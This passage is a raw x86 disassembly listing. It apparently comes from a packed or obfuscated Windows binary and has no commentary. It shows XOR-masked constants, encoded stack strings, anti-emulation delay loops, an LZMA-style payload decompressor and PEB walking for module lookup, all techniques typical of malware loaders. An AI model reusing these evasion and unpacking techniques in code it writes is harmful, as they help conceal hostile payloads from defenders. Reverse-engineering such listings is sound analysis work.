  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
